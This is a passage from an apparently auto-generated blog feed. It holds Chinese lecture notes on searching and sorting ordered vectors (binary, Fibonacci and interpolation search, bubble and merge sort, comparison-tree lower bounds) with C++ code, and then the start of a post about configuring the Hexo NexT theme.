<p><strong>高效算法</strong><br>有序向量每一组重复元素必然相互紧邻构成一个重复区间，所谓去重就是为每一重复区间保留单个元素，以重复区间为单位，成批删除雷同元素。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">int</span> Vector&lt;T&gt;::uniquify() &#123; <span class="comment">//有序向量重复元素剔除算法（高效版）</span></span><br><span class="line">   Rank i = <span class="number">0</span>, j = <span class="number">0</span>; <span class="comment">//各对互异“相邻”元素的秩</span></span><br><span class="line">   <span class="keyword">while</span> ( ++j &lt; _size ) <span class="comment">//逐一扫描，直至末元素</span></span><br><span class="line">      <span class="keyword">if</span> ( _elem[i] != _elem[j] ) <span class="comment">//跳过雷同者</span></span><br><span class="line">         _elem[++i] = _elem[j]; <span class="comment">//发现不同元素时，向前移至紧邻于前者右侧</span></span><br><span class="line">   _size = ++i; shrink(); <span class="comment">//直接截除尾部多余元素</span></span><br><span class="line">   <span class="keyword">return</span> j - i; <span class="comment">//向量规模变化量，即被删除元素总数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>共计$n-1$次迭代，累计$O(n)$时间。</p>
<h2 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h2><p><strong>版本a</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">static</span> Rank <span class="title">binSearch</span> <span class="params">( T* A, T <span class="keyword">const</span>&amp; e, Rank lo, Rank hi )</span> </span>&#123;</span><br><span class="line">   <span class="keyword">while</span> ( lo &lt; hi ) &#123; <span class="comment">//每步迭代可能要做两次比较判断，有三个分支</span></span><br><span class="line">      Rank mi = ( lo + hi ) &gt;&gt; <span class="number">1</span>; <span class="comment">//以中点为轴点</span></span><br><span class="line">      <span class="keyword">if</span>      ( e &lt; A[mi] ) hi = mi; <span class="comment">//深入前半段[lo, mi)继续查找</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( A[mi] &lt; e ) lo = mi + <span class="number">1</span>; <span class="comment">//深入后半段(mi, hi)继续查找</span></span><br><span class="line">      <span class="keyword">else</span>                <span class="keyword">return</span> mi; <span class="comment">//在mi处命中</span></span><br><span class="line">   &#125; <span class="comment">//成功查找可以提前终止</span></span><br><span class="line">   <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">//查找失败</span></span><br><span class="line">&#125; <span class="comment">//有多个命中元素时，不能保证返回秩最大者；查找失败时，简单地返回-1，而不能指示失败的位置</span></span><br></pre></td></tr></table></figure>
<p>尽管二分查找将之前的向量分为了两部分，却不是二分递归，而是线性递归。每一实例有两个可能的递归方向，却只能从中选择其一，故每个层次上的递归实例构成一个线性次序关系。</p>
<blockquote>
<p>递推方程分析</p>
</blockquote>
<p>$T(n)=T(n/2)+O(1)=O(logn)$,大大优于顺序查找</p>
<blockquote>
<p>递归跟踪分析</p>
</blockquote>
<p>轴点总取作中点，递归深度$O(logn)$,各递归实例均耗时$O(1)$</p>
<p><strong>查找长度</strong>  </p>
<p>为了更为精细地评估查找算法地性能，考查关键码的比较次数。</p>
<p>分别针对成功查找和失败查找，从最好、最坏、平均情况等角度评估。</p>
<p>对于长度为$n$的有序向量，共有$n$种可能的成功查找，分别对应于某一元素。实际上，每一种成功的查找长度仅仅取决于$n$和目标元素所对应的秩，而与元素的具体数值无关。</p>
<blockquote>
<p>将平均的成功查找长度和失败查找长度分别记作S和S’,则(S+1)n=F(n+1)</p>
</blockquote>
<p>成功查找长度和失败查找长度均为$O(1.5logn)$</p>
<p>在每一步迭代过程中为了确定左右分支方向，需要做一次或两次比较，从而造成不同情况对应查找长度的不均衡。</p>
<p>转向左右分支的关键码比较次数不等，而递归深度却相同。</p>
<p>为了改善均衡性，有两种解决思路：</p>
<ul>
<li>通过递归深度的不均衡，对转向成本进行补偿，缩短平均查找长度</li>
<li>统一沿两个方向深入需要执行的比较次数</li>
</ul>
<p><strong>版本b</strong></p>
<p>每次迭代时仅做1次关键码比较，如此，所有的分支只有2个方向而不是3个方向</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">static</span> Rank <span class="title">binSearch</span> <span class="params">( T* A, T <span class="keyword">const</span>&amp; e, Rank lo, Rank hi )</span> </span>&#123;</span><br><span class="line">   <span class="keyword">while</span> ( <span class="number">1</span> &lt; hi - lo ) &#123; <span class="comment">//每步迭代仅需做一次比较判断，有两个分支；成功查找不能提前终止</span></span><br><span class="line">      Rank mi = ( lo + hi ) &gt;&gt; <span class="number">1</span>; <span class="comment">//以中点为轴点</span></span><br><span class="line">      ( e &lt; A[mi] ) ? hi = mi : lo = mi; <span class="comment">//经比较后确定深入[lo, mi)或[mi, hi)</span></span><br><span class="line">   &#125; <span class="comment">//有效区间的宽度缩减至1时算法才会终止</span></span><br><span class="line">   <span class="keyword">return</span> ( e == A[lo] ) ? lo : <span class="number">-1</span> ; <span class="comment">//查找成功时返回对应的秩；否则统一返回-1</span></span><br><span class="line">&#125; <span class="comment">//有多个命中元素时，不能保证返回秩最大者；查找失败时，简单地返回-1，而不能指示失败的位置</span></span><br></pre></td></tr></table></figure>
<p>只有当元素数目$hi-lo=1$时才判断元素是否命中。</p>
<p>knuth指出将三分支改为两分支的改进效果需要到n非常大(2^66)后方能体现，针对当前规模来说，这一优化得不偿失。</p>
<p><strong>版本c</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">static</span> Rank <span class="title">binSearch</span> <span class="params">( T* A, T <span class="keyword">const</span>&amp; e, Rank lo, Rank hi )</span> </span>&#123;</span><br><span class="line">   <span class="keyword">while</span> ( lo &lt; hi ) &#123; <span class="comment">//每步迭代仅需做一次比较判断，有两个分支</span></span><br><span class="line">      Rank mi = ( lo + hi ) &gt;&gt; <span class="number">1</span>; <span class="comment">//以中点为轴点</span></span><br><span class="line">      ( e &lt; A[mi] ) ? hi = mi : lo = mi + <span class="number">1</span>; <span class="comment">//经比较后确定深入[lo, mi)或(mi, hi)</span></span><br><span class="line">   &#125; <span class="comment">//成功查找不能提前终止</span></span><br><span class="line">   <span class="keyword">return</span> --lo; <span class="comment">//循环结束时，lo为大于e的元素的最小秩，故lo - 1即不大于e的元素的最大秩</span></span><br><span class="line">&#125; <span class="comment">//有多个命中元素时，总能保证返回秩最大者；查找失败时，能够返回失败的位置</span></span><br></pre></td></tr></table></figure>
<p>待查找区间宽度缩减为0时算法结束，返回不大于e的最后一个元素，此前的版本均未实现此约定。</p>
<p><strong>不变性</strong> </p>
<p>在算法执行的任意过程中，<code>A[lo-1]/A[hi]</code>​总是当前不大于e的最大者/大于e的最小者</p>
<p>当算法终止时，<code>A[lo-1]/A[hi]​</code>即是全局的大于e的最大者/大于e的最小者</p>
<h2 id="斐波那契查找"><a href="#斐波那契查找" class="headerlink" title="斐波那契查找"></a>斐波那契查找</h2><p>二分查找版本A转向左右分之前的关键码比较次数不相等，而递归长度却相同，通过递归深度的不平衡对转向成本的不平衡进行补偿，平均查找长度可进一步缩短。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">static</span> Rank <span class="title">fibSearch</span> <span class="params">( T* A, T <span class="keyword">const</span>&amp; e, Rank lo, Rank hi )</span> </span>&#123;</span><br><span class="line">   <span class="function">Fib <span class="title">fib</span> <span class="params">( hi - lo )</span></span>; <span class="comment">//用O(log_phi(n = hi - lo)时间创建Fib数列</span></span><br><span class="line">   <span class="keyword">while</span> ( lo &lt; hi ) &#123; <span class="comment">//每步迭代仅仅做一次比较判断，有两个分支</span></span><br><span class="line">      <span class="keyword">while</span> ( hi - lo &lt; fib.get() ) fib.prev(); <span class="comment">//通过向前顺序查找（分摊O(1)）——至多迭代几次？</span></span><br><span class="line">      Rank mi = lo + fib.get() - <span class="number">1</span>; <span class="comment">//确定形如Fib(k) - 1的轴点</span></span><br><span class="line">      ( e &lt; A[mi] ) ? hi = mi : lo = mi + <span class="number">1</span>; <span class="comment">//比较后确定深入前半段[lo, mi)或后半段(mi, hi)</span></span><br><span class="line">   &#125; <span class="comment">//成功查找不能提前终止</span></span><br><span class="line">   <span class="keyword">return</span> --lo; <span class="comment">//循环结束时，lo为大于e的元素的最小秩，故lo - 1即不大于e的元素的最大秩</span></span><br><span class="line">&#125; <span class="comment">//有多个命中元素时，总能保证返回最秩最大者；查找失败时，能够返回失败的位置</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>成功平均查找长度为$O(log_{\phi}n)=O(log_{\phi}nlog_{2} \phi)=O(1.44log_2{n})$\</p>
<p>失败平均查找长度不超过$\lambda log_2{n+1}=O(\lambda log_2{n})$</p>
<p>其中$\lambda=1+1/\phi^2=3-\phi=1.382$</p>
<h2 id="通用策略"><a href="#通用策略" class="headerlink" title="通用策略"></a>通用策略</h2><p><img src="https://i.loli.net/2019/11/05/GlLOQrfTt17D3x9.png"></p>
<p><img src="https://i.loli.net/2019/11/05/B23VfkubCRrhXdj.png"></p>
<h2 id="索引查找"><a href="#索引查找" class="headerlink" title="索引查找"></a>索引查找</h2><p>$m$级索引，每一级索引内部采用顺序查找，可将查找的时间复杂度降低至$n^{1/m}$</p>
<h2 id="插值查找"><a href="#插值查找" class="headerlink" title="插值查找"></a>插值查找</h2><p>假设：已知有序向量中各元素随机分布的规律，比如：均匀且独立的随机分布，</p>
<p>于是[lo,hi)内各元素应大致按照线性趋势增长</p>
<p>$\displaystyle \frac{mi-hi}{hi-lo}  \approx \frac{e-A[lo]}{A[hi]-A[lo]}$</p>
<p>因此，通过猜测轴点mi,可以极大地提高收敛速度</p>
<p>$\displaystyle mi  \approx lo+(hi-lo)\frac{e-A[lo]}{A[hi]-A[lo]} $</p>
<p>以英文字典为例，<code>binary</code>大致位于$2/26$处</p>
<p><code>search</code>大致位于$19/26$处</p>
<p><img src="https://i.loli.net/2019/11/06/NIBimO1kYDL5jsS.png"></p>
<p><strong>性能分析</strong></p>
<p>最坏:$O(hi-lo)=O(n)$</p>
<p>平均:每经过一次比较，待查找区间宽度由$n$缩至$\sqrt{n}$</p>
<p>$n,\sqrt{n},\sqrt{\sqrt{n}},…,2$</p>
<p>$n,n^{1/2},n^{1/2^2},n^{1/2^{k}},…,2$</p>
<p>经过$k$次比较后，$n^{1/2^k}&lt;2$,$k=O(loglogn)$</p>
<p>每经过一次比较，待查找区间宽度地数值开放，有效字长减半</p>
<p>插值查找为在字长意义上地折半查找</p>
<p>二分查找为在字长意义上的顺序查找</p>
<blockquote>
<p>从$O(logn)$到$O(loglogn)$,是否值得？</p>
</blockquote>
<p>通常优势不明显，除非查找区间宽度极大，或者比较操作成本极高</p>
<p>比如,$n=2^(2^5)=2^{32}=4G$时，$log2{n}=32,log_2(log_2(n))=5$</p>
<p>易受小扰动的干扰和蒙骗</p>
<p>须引入乘法和除法运算</p>
<p>可先通过插值查找将查找范围缩小至一定的尺度，然后再进行二分查找</p>
<blockquote>
<p>每经过一次插值和查找，待搜索区间的宽度大致以平方根的速度递减</p>
</blockquote>
<p>最坏情况下仍然为$O(n)$，即极端不平衡的情况，{1,2,2000,2001,999999,9999999}</p>
<p>假设数据在某个范围内均匀分布，插值查找每经过一次比较，待搜索区间以平方根速度递减。时间复杂度为$O(loglogN)$。需要注意，$O(loglogN)$的复杂度是平均期望复杂度，而不是最坏情况复杂度。</p>
<h1 id="起泡排序"><a href="#起泡排序" class="headerlink" title="起泡排序"></a>起泡排序</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> Vector&lt;T&gt;::bubbleSort ( Rank lo, Rank hi ) <span class="comment">//assert: 0 &lt;= lo &lt; hi &lt;= size</span></span><br><span class="line">&#123; <span class="keyword">while</span> ( !bubble ( lo, hi-- ) ); &#125; <span class="comment">//逐趟做扫描交换，直至全序</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">bool</span> Vector&lt;T&gt;::bubble ( Rank lo, Rank hi ) &#123; <span class="comment">//一趟扫描交换</span></span><br><span class="line">   <span class="keyword">bool</span> sorted = <span class="literal">true</span>; <span class="comment">//整体有序标志</span></span><br><span class="line">   <span class="keyword">while</span> ( ++lo &lt; hi ) <span class="comment">//自左向右，逐一检查各对相邻元素</span></span><br><span class="line">      <span class="keyword">if</span> ( _elem[lo - <span class="number">1</span>] &gt; _elem[lo] ) &#123; <span class="comment">//若逆序，则</span></span><br><span class="line">         sorted = <span class="literal">false</span>; <span class="comment">//意味着尚未整体有序，并需要</span></span><br><span class="line">         swap ( _elem[lo - <span class="number">1</span>], _elem[lo] ); <span class="comment">//通过交换使局部有序</span></span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">return</span> sorted; <span class="comment">//返回有序标志</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在对$n$个元素做起泡排序的过程中，可能会发生：</p>
<ul>
<li>所有元素均无需移动</li>
<li>某元素会一度(朝着远离其最终位置的方向)逆向移动</li>
<li>某元素的初始位置与其最终位置相邻，却需要参与$n-1$次交换</li>
<li>所有元素均参加$n-1$次交换</li>
</ul>
<p>稳定算法的特征是，重复元素之间的相对次序在排序前后保持一致。反之，不具有这一特征的排序算法都是不稳定算法。以上排序算法是稳定的，在起泡排序算法中，元素相对位置调整的唯一可能是某元素<code>_elem[i-1]</code>严格大于其后继<code>_elem[i]</code>。也就是说，在这种亦步亦趋的交换算法中，重复元素可能靠拢，但绝对不会相互跨越。由此可知，起泡排序算法为稳定算法。</p>
<p>乱序在$A[0,\sqrt{n}]$时，仍然需要调用<code>bubble()</code>,共做$\Omega(n)$次交换操作和$\Omega(n^{3/2})$次比较操作，外循环$\sqrt{n}$次，内循环$n$次</p>
<p><strong>优化</strong> 返回最右侧逆序对的位置</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> Vector&lt;T&gt;::bubbleSort ( Rank lo, Rank hi ) <span class="comment">//assert: 0 &lt;= lo &lt; hi &lt;= size</span></span><br><span class="line">&#123; <span class="keyword">while</span> ( lo &lt; ( hi = bubble ( lo, hi ) ) ); &#125; <span class="comment">//逐趟做扫描交换，直至全序</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; Rank Vector&lt;T&gt;::bubble ( Rank lo, Rank hi ) &#123; <span class="comment">//一趟扫描交换</span></span><br><span class="line">   Rank last = lo; <span class="comment">//最右侧的逆序对初始化为[lo - 1, lo]</span></span><br><span class="line">   <span class="keyword">while</span> ( ++lo &lt; hi ) <span class="comment">//自左向右，逐一检查各对相邻元素</span></span><br><span class="line">      <span class="keyword">if</span> ( _elem[lo - <span class="number">1</span>] &gt; _elem[lo] ) &#123; <span class="comment">//若逆序，则</span></span><br><span class="line">         last = lo; <span class="comment">//更新最右侧逆序对位置记录，并</span></span><br><span class="line">         swap ( _elem[lo - <span class="number">1</span>], _elem[lo] ); <span class="comment">//通过交换使局部有序</span></span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">return</span> last; <span class="comment">//返回最右侧的逆序对位置</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样以乱序只存在$A[0,\sqrt{n}]$时，仅需一趟扫描交换$O( n )$即可确定逆序数存在的空间，累计耗时：</p>
<p>$O(n+(\sqrt n)^2)$=$O(n)$</p>
<h1 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//向量归并排序</span></span><br><span class="line"><span class="keyword">void</span> Vector&lt;T&gt;::mergeSort ( Rank lo, Rank hi ) &#123; <span class="comment">//0 &lt;= lo &lt; hi &lt;= size</span></span><br><span class="line">   <span class="keyword">if</span> ( hi - lo &lt; <span class="number">2</span> ) <span class="keyword">return</span>; <span class="comment">//单元素区间自然有序，否则...</span></span><br><span class="line">   <span class="keyword">int</span> mi = ( lo + hi ) / <span class="number">2</span>; <span class="comment">//以中点为界</span></span><br><span class="line">   mergeSort ( lo, mi ); mergeSort ( mi, hi ); <span class="comment">//分别排序</span></span><br><span class="line">   merge ( lo, mi, hi ); <span class="comment">//归并</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//有序向量的归并</span></span><br><span class="line"><span class="keyword">void</span> Vector&lt;T&gt;::merge ( Rank lo, Rank mi, Rank hi ) &#123; <span class="comment">//各自有序的子向量[lo, mi)和[mi, hi)</span></span><br><span class="line">   T* A = _elem + lo; <span class="comment">//合并后的向量A[0, hi - lo) = _elem[lo, hi)</span></span><br><span class="line">   <span class="keyword">int</span> lb = mi - lo; T* B = <span class="keyword">new</span> T[lb]; <span class="comment">//前子向量B[0, lb) = _elem[lo, mi)</span></span><br><span class="line">   <span class="keyword">for</span> ( Rank i = <span class="number">0</span>; i &lt; lb; B[i] = A[i++] ); <span class="comment">//复制前子向量</span></span><br><span class="line">   <span class="keyword">int</span> lc = hi - mi; T* C = _elem + mi; <span class="comment">//后子向量C[0, lc) = _elem[mi, hi)</span></span><br><span class="line">   <span class="keyword">for</span> ( Rank i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>; ( j &lt; lb ) || ( k &lt; lc ); ) &#123; <span class="comment">//B[j]和C[k]中的小者续至A末尾</span></span><br><span class="line">      <span class="keyword">if</span> ( ( j &lt; lb ) &amp;&amp; ( ! ( k &lt; lc ) || ( B[j] &lt;= C[k] ) ) ) A[i++] = B[j++];</span><br><span class="line">      <span class="keyword">if</span> ( ( k &lt; lc ) &amp;&amp; ( ! ( j &lt; lb ) || ( C[k] &lt;  B[j] ) ) ) A[i++] = C[k++];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">delete</span> [] B; <span class="comment">//释放临时空间B</span></span><br><span class="line">&#125; <span class="comment">//归并后得到完整的有序向量[lo, hi)</span></span><br></pre></td></tr></table></figure>
<p><strong>综合评价</strong></p>
<p>优点</p>
<ul>
<li>实现最坏情况下最优$O(nlogn)$性能的第一个排序算法</li>
<li>不许随机读写，完全顺序访问，尤其适用于列表之类的序列和磁盘之类的设备</li>
<li>只要实现得当，可保证稳定，在出现雷同元素时，左侧子向量优先</li>
<li>可扩展性极佳，十分适宜于外部排序(海量网页搜索结果的合并)</li>
<li>易于并行化</li>
</ul>
<p>缺点</p>
<ul>
<li>非就地，需要对等规模的辅助空间</li>
<li>即便输入完全(接近)有序，仍需$O(nlogn)$时间</li>
</ul>
<p><strong>优化</strong></p>
<p>在最好情况下仍然需要$O(nlogn)$时间，在业已有序的情况下不必再合并，每个递归实例为常数时间，复杂度优化至$O(n)$。以mi为界划分为两个子序列A[lo,mi),A[mi,hi)，若后一个子序列的最小值大于等于前一个子序列的最大值，则已有序，无需再合并。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//向量归并排序</span></span><br><span class="line"><span class="keyword">void</span> Vector&lt;T&gt;::mergeSort ( Rank lo, Rank hi ) &#123; <span class="comment">//0 &lt;= lo &lt; hi &lt;= size</span></span><br><span class="line">   <span class="keyword">if</span> ( hi - lo &lt; <span class="number">2</span> ) <span class="keyword">return</span>; <span class="comment">//单元素区间自然有序，否则...</span></span><br><span class="line">   <span class="keyword">int</span> mi = ( lo + hi ) / <span class="number">2</span>; <span class="comment">//以中点为界</span></span><br><span class="line">   mergeSort ( lo, mi ); mergeSort ( mi, hi ); <span class="comment">//分别排序</span></span><br><span class="line">   <span class="keyword">if</span>(_elem[mi<span class="number">-1</span>]&gt;_elem[mi])merge ( lo, mi, hi ); <span class="comment">//归并</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="排序与下界"><a href="#排序与下界" class="headerlink" title="排序与下界"></a>排序与下界</h1><p>从数据处理的角度来看，有序性在很多场合都可以极大地提高计算效率。在解决许多应用问题时普遍采用的一种策略就是首先将向量转换为有序向量，再调用有序向量支持的各种高效算法，这一过程就是向量的排序。</p>
<p>以下给出排序的准确定义：</p>
<p>任意给定N个元素${R1,R2,…,Rn}$,对应关键码${K1,…,Kn}$,需按某种次序排列。亦即是找出$&lt;1,2,3,..,n&gt;$的一个排列，使得$K_{i1}\leq K_{i2}\leq K_{i3}\leq…\leq K_{in}$</p>
<p>例如，$3,1,4,1,5,9,2,6$ 经排序后的序列为$1,1,2,3,4,5,6,9$</p>
<p>在实际应用中，25%到50%的计算都可以归于排序。</p>
<p>排序算法是个庞大的家族，其中根据处理数据的规模和存储的特点不同，分为内部排序算法和外部排序算法，内部排序是数据记录在内存中进行排序，而外部排序因为排序的数据很大，一次不能容纳全部的排序记录，在排序的过程中需要访问外存。</p>
<p>根据输入方式的不同，可分为在线算法和离线算法。前一情况下，待排序算法通常以批处理的形式整理给出，在网络计算等环境中，待排序的算法通常需要实时生成，在排序算法启动后数据才陆续到达。</p>
<p>再如，针对所依赖的体系结构的不同，排序算法又可分为串行和并行两类排序算法。另外，根据算法是否采用随机策略，还有确定式和随机式之分。</p>
<h2 id="下界"><a href="#下界" class="headerlink" title="下界"></a>下界</h2><p>在着手优化算法时，我们首先需要解决以下几个问题</p>
<ul>
<li>起泡排序的复杂度为$O(n^2)$,归并排序算法的复杂度为$O(nlogn)$,这一效率是否已经足够高？</li>
<li>能否以更快的速度完成排序</li>
</ul>
<p>考虑以下问题：三只苹果外观一致，其中两只重量相同另一只不同，利用一架天平如何从中找出重量不同的那只？</p>
<p>以上问题所需的最少比较次数为多少次？</p>
<p>尽管很多算法都可以优化，但是对任一特定应用问题随着算法的不断改进，其效率的提高必然存在某一极限。这一极限不仅必然存在，其具体的数值应取决于应用问题本身以及所采用的计算模型。</p>
<p>一般地，任一问题在最快情况下的最低计算成本，即为该问题的复杂度下界，一旦某一算法的性能达到这一下界，即意味着它已经是最坏情况下最优的。</p>
<h2 id="比较树"><a href="#比较树" class="headerlink" title="比较树"></a>比较树</h2><p>若用结点表示算法中的不同状态，用有方向的边表示不同状态之间的转换相互转换。</p>
<p>一般地，树根结点对应于算法入口处的起始状态，内部结点对应于过程中的某步计算，通常属于基本操作，叶结点则对应于经一系列计算后某次运行的终止状态。</p>
<p>算法所有可能的执行过程都可涵盖于比较树中。具体地，该树具有以下性质</p>
<ul>
<li>每一内部节点对应于一次比对操作</li>
<li>内部节点的左右分支分别对应于在两种比对操作下的执行方向</li>
<li>叶节点(根到叶节点的路径)对应于算法某次执行的完整过程及输出</li>
<li>反过来，算法的每一次运行都对应于从根到某一叶节点的路径</li>
</ul>
<p>按上述规则与算法对应的树称为比较树。无论什么算法，只要其中的分支都完全取决于不同变量或常量的比对或比较结果，则该算法所有可能的执行过程都对应于从根到某一叶节点的路径。反之，可如此描述的算法都称为基于比较式算法，简称CBA式算法。</p>
<p><strong>估计下界</strong></p>
<p>考查任一CBA式算法A,设CT(A)为与之对应的一棵比较树。</p>
<p>根据比较树的性质，算法A每次运行的时间都取决于其对应叶节点到根节点的距离，而算法A在最坏情况下的运行时间将取决于比较树中所有叶节点的最大深度，即该树的高度，记作h(CT(A))。就渐进意义而言，算法A的时间复杂度应不低于h(CT(A))。</p>
<p>以苹果鉴别为例，可能的输出结果有N=3种，故解决该问题的任一CBA式算法所对应比较树的高度为：</p>
<p>$h \geq \lceil log_23 \rceil=2$ </p>
<p>因此，只要是采用CBA式算法，则无论如何优化，在最坏情况下都至少需要2次称量。</p>
<p>再以CBA式排序算法为例,$n$个元素而言，可能的输出有$n!$种，元素之间不仅可以判等还可以比较大小，因此每一节点都对应有三个分支(分别对应大于、等于、小于的情况)。任一CBA式排序算法对应比较树的高度为：</p>
<p>$h \geq \lceil log_3{n!}\rceil=\Omega(nlogn)$</p>
<p>可见，最坏情况下CBA式排序算法至少需要$\Omega(nlogn)$时间，其中$n$为待排序元素的数目。</p>
<p>这一复杂度下界是针对基于比较树的模型而言的，很多不属于此类型的算法在最坏情况下的复杂度可能低于这一下界。</p>
<h2 id="归约"><a href="#归约" class="headerlink" title="归约"></a>归约</h2><p>除了比较树，归约同样也是证明下界的有力工具。</p>
<p>一般地，考查难度待界定的问题B，若另一问题A满足以下性质：</p>
<ul>
<li>问题A的任一输入，在线性时间内可以转换为问题B的输入</li>
<li>问题B的任一输出，在线性时间内可以转换为问题A的输出</li>
</ul>
<p>则称问题A在线性时间内归约为问题B，若问题A的难度已界定为严格地高于$\Omega(n)$,亦即</p>
<p>$|A|=\Omega(f(n))=\omega(n)$</p>
<p>则问题B也不会低于这个复杂度下界,亦即</p>
<p>$|B|\geq|A|=\Omega(f(n))$</p>
<p>实际上，若问题A可线性归约为问题B，则由后者的任一算法必然可以导出前者的一个算法。为求解问题A，可将其输入转化为问题B的输入，再调用后者的算法，将其转换为前者的输出。</p>
<p><img src="https://i.loli.net/2019/11/06/BmWlncHbugyGSZA.png"></p>
<p>因此，假若问题B具有一个更低的下界，则至少存在一个$\alpha(f(n))$的算法，于是由以上可知，问题A存在一个$\alpha(f(n))$的算法，这与问题A的已知下界不符。</p>
<p>为运用线性归约问题B的下界，须经历以下步骤：</p>
<ul>
<li>找到难度已知的问题A</li>
<li>证明问题A可归约为问题B</li>
</ul>
<blockquote>
<p>证明有序向量唯一化的最低复杂度为nlogn</p>
</blockquote>
<p>作为参照，考查所谓元素的唯一性问题(element uniqueness,简称EU)A:对于任意n个实数，判定其中是否有重复者，无序向量唯一化为难度待界定的问题B，简称为UNIQ</p>
<p>作为EU问题的输入，任意n个实数可在线性时间内组织为一个无序向量，从而转换为UNIQ问题的输入，另一方面，一旦得到UNIQ的问题输出(即去重以后的向量)，只需线性时间核对向量的规模是否仍然为n，即可判定原实数中是否存在重复者。</p>
<p>EU问题具有$\Omega(nlogn)$的复杂度下界，故以上所给的$nlogn$已属最优。</p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>Next博客配置</title>
    <url>/config/next/</url>
    <content><![CDATA[<p>在将近一年没有写博客之后，我又重新捡起之前的博客开始写了。至于为什么想写博客呢，<a href="https://wdxtub.com/qa/why-writing-blog/2013/10/17/">小土刀</a>的博客中提到</p>
<blockquote>
<p>我睡觉的时候大家的夜生活才刚刚开始，我醒来的时候大家却仍在熟睡，每天在禅修中等待天亮。想找人聊聊最近读的书，但是却没有志趣相投的，平日的聊天也大都跟技术相关，不怪乎其他专业的人觉得我们无趣了。我找不到人聊政治制度，找不到人聊历史，找不到人聊心理学，找不到人聊经济，我只能自己跟自己聊。</p>
<p>这就是我写博客的原因，这是我跟自己沟通的方式。我们每天每时每刻都有可能冒出各种各样光怪陆离的想法，这些想法在当时无比清晰，但是保质期却很短，常常睡一觉就变质，而写博客就是把这些想法打磨和雕琢的方法之一。通过写博客，我得意把这些想法永久地保存下来。</p>
</blockquote>
<p>不得不说，这一年来，不写博客的确思索少了很多，没有像之前一样，学过什么之后就及时回顾，只是记得一些大概的细节。之后应该会更新一下之前停滞的数据库系统和分布式系统系列，再写研究方向(自然语言处理)的分析。</p>
<a id="more"></a>

<p>博客基于hexo框架搭建，选择主题为next，其余可以选择主题<a href="https://hexo.io/themes/">参照</a>，给出的github链接里面一般会有基于该主题搭建的博客样式和具体操作。比较推荐的有<a href="https://github.com/litten/hexo-theme-yilia">yilia主题</a>、<a href="https://sariay.github.io/hexo-theme-Annie/">annie主题</a>、<a href="https://probberechts.github.io/hexo-theme-cactus/cactus-light/public/">cactus-light主题</a>、<a href="https://hexo.fluid-dev.com/">fluid主题</a>、<a href="https://blog.orduster.top/">butterfly主题</a>，具体操作可以看博主搭建个人博客的博客。拿我来说，选择主题标准主要是简洁、博客特效不花(否则容易分散博客阅读的精力)、容易搭建，next的star数量远远高于其他主题，目前作者维持每月一更的进度，bug不太多，所以就选择了next主题。基于next有诸多<a href="https://github.com/theme-next/awesome-next#live-preview">博客样例</a>，其中个人比较喜欢<a href="https://tding.top/">小丁的个人博客</a>、<a href="http://yearito.cn/">yearito’s blog</a>、<a href="https://leay.net/">荷七博客</a>、<a href="https://www.julydate.com/">七夏浅笑</a>、<a href="https://www.idefun.com/">idefun</a>这几个，idefun的<a href="https://www.idefun.com/resume/">个人简历</a>页似乎还可以直接编辑。个性化定制主要是css具体样式定制和next主页里的选项，next个性化之后也有<a href="https://sxxkearth.github.io/tags/hexo%E5%8D%9A%E5%AE%A2/">界面</a>类似于butterfly主题，个性美化可以<a href="https://lruihao.cn/posts/hexobuild.html">参照</a>，样式设置可以<a href="https://qianling.pw/style/">参照</a>。</p>
<blockquote>
<p>现在 star 在 1k 以上的榜单如下：</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/iissnan/hexo-theme-next">iissnan/hexo-theme-next</a>, Elegant theme for Hexo., 15.5k</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/litten/hexo-theme-yilia">litten/hexo-theme-yilia</a>, 一个简洁优雅的hexo主题 A simple and elegant theme for hexo., 7.8k</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/theme-next/hexo-theme-next">theme-next/hexo-theme-next</a>, Elegant and powerful theme for Hexo., 6.3k</p>
